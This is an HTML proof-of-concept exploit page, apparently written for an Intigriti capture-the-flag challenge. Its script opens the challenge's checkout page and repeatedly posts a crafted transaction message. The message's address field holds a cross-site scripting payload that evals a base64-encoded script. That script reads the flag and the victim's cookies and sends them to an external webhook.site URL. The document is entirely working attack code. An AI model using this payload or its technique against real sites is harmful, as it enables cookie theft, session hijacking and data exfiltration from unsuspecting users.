<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Exploit POC</title>
</head>
<body>
    <button onclick="execute()" style="padding: 20px; font-size: 20px;">Launch Exploit</button>
    <div id="log"></div>

    <script>
        const TARGET_BASE = "https://challenge-0126.intigriti.io";
        const CHECKOUT_URL = TARGET_BASE + "/checkout.html";
        const MARKETWATCH_URL = TARGET_BASE + "/marketwatch.html";
        const WEBHOOK_URL = "https://webhook.site/8213b378-934a-402b-8f55-fc2bac82c32d";

        function log(msg) {
            document.getElementById("log").innerText = msg;
        }

        const exfilScript = `
            fetch('/checkout.html')
            .then(r => r.text())
            .then(html => {
                var parser = new DOMParser();
                var doc = parser.parseFromString(html, 'text/html');
                var flag = doc.getElementById('flagText') ? doc.getElementById('flagText').innerText : 'NOT_FOUND';
                var cookies = document.cookie;
                window.location.href = "${WEBHOOK_URL}?flag=" + btoa(flag) + "&cookie=" + btoa(cookies);
            })
            .catch(e => window.location.href = "${WEBHOOK_URL}?error=" + btoa(e));
        `;

        const base64Exfil = btoa(exfilScript);
        const xssPayload = `"><img src=x onerror=eval(atob('${base64Exfil}'))>`;

        function execute() {
            log("Opening target...");
            let win = window.open(CHECKOUT_URL, "targetWindow");

            setTimeout(() => {
                log("Sending payload...");

                const postMessageData = {
                    type: "submitTransaction",
                    transaction: {
                        currency: "1337COIN",
                        amount: 1337,
                        toAddress: xssPayload
                    }
                };

                let attempts = 0;
                let interval = setInterval(() => {
                    win.postMessage(postMessageData, "*");
                    attempts++;

                    if (attempts > 15) {
                        clearInterval(interval);
                        log("Redirecting...");
                        win.location.href = MARKETWATCH_URL;
                    }
                }, 500);

            }, 3000);
        }
    </script>
</body>
</html>
